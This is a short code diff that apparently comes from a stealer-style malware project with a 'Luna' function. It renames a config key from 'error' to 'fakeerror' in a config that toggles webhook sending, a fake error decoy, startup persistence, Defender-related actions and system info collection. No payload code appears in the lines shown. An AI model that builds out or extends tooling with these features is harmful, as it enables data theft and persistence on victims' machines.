@@ -25,7 +25,7 @@ __CONFIG__ = {
     "webhook": "None",
     "ping": False,
     "pingtype": "None",
-    "error": False,
+    "fakeerror": False,
     "startup": False,
     "defender": False,
     "systeminfo": False,
@@ -104,7 +104,7 @@ def Luna(webhook: str):
 
 
 def configcheck(list):
-    if not __CONFIG__["error"]:
+    if not __CONFIG__["fakeerror"]:
         list.remove(fakeerror)
     if not __CONFIG__["startup"]:
         list.remove(startup)
